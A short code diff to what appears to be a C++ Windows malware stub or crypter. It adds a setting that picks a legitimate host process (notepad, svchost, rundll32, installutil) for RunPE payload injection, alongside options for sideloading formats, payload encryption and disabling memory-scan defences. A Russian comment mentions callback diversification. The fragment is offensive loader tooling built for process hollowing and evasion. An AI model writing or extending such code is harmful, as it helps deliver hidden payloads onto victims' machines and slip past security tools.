@@ -91,7 +91,8 @@ struct StubConfig {
     unsigned char sideloadFormatType; // 0=EXE,1=CPL,2=XLL,3=MSI,4=HTA,5=JS,6=VBS
     unsigned char encAlgorithm;       // 0=AES,1=ChaCha,2=RC4,3=XOR
     unsigned char researchPackage;    // 0=None,1=Ghost,2=Neuro,3=Darknet
-    char pad[5];                      // Alignment to 44 bytes total
+    unsigned char hostProcess;        // 0=notepad,1=svchost,2=rundll32,3=installutil
+    char pad[4];                      // Alignment to 44 bytes total
 };
 
 static_assert(sizeof(StubConfig) == 44, "StubConfig must be 44 bytes");
@@ -515,7 +516,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     else if (GlobalConfig.bRunPE) {
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
-        GodMode::ExecutePayload(PayloadData.data, decryptSize, false, true);
+        GodMode::ExecutePayload(PayloadData.data, decryptSize, false, true, GlobalConfig.hostProcess);
     }
     else if (GlobalConfig.bCallbackDiv) {
         // Layer 2: Callback Diversification — thread из kernel32 callback
